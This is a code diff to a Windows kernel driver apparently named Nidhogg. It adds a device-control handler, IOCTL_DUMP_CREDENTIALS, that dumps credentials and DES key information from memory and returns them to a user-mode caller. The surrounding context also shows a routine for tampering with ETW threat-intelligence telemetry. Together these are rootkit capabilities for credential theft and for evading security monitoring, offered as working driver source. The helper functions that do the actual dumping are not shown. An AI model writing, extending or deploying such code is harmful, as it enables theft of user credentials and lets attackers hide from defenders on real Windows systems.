@@ -1,5 +1,6 @@
 #pragma once
 #include "pch.h"
+#include "MemoryHelper.hpp"
 #include "MemoryAllocator.hpp"
 
 #define VALID_SIZE(DataSize, StructSize)(DataSize != 0 && DataSize % StructSize == 0)
@@ -1185,6 +1186,43 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			Print(DRIVER_PREFIX "Failed to tamper ETWTI (0x%08X)\n", status);
 
 		len += sizeof(ULONG);
+		break;
+	}
+
+	case IOCTL_DUMP_CREDENTIALS:
+	{
+		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;
+
+		if (!VALID_SIZE(size, sizeof(ULONG)) && !VALID_SIZE(size, sizeof(DesKeyInformation)) && !VALID_SIZE(size, sizeof(OutputCredentials))) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		if (size == sizeof(ULONG)) {
+			ULONG sizeToAlloc = 0;
+			ULONG* data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
+			status = NidhoggMemoryUtils->DumpCredentials(&sizeToAlloc);
+
+			if (NT_SUCCESS(status)) {
+				status = ProbeAddress(data, sizeof(ULONG), sizeof(ULONG), STATUS_INVALID_ADDRESS);
+
+				if (NT_SUCCESS(status))
+					*data = sizeToAlloc;
+			}
+		}
+		else if (size == sizeof(OutputCredentials)) {
+			OutputCredentials* data = (OutputCredentials*)Irp->AssociatedIrp.SystemBuffer;
+			status = NidhoggMemoryUtils->GetCredentials(data);
+		}
+		else {
+			DesKeyInformation* data = (DesKeyInformation*)Irp->AssociatedIrp.SystemBuffer;
+			status = NidhoggMemoryUtils->GetDesKey(data);
+		}
+
+		if (!NT_SUCCESS(status))
+			Print(DRIVER_PREFIX "Failed to dump credentials (0x%08X)\n", status);
+
+		len += size;
 		break;
 	}
 
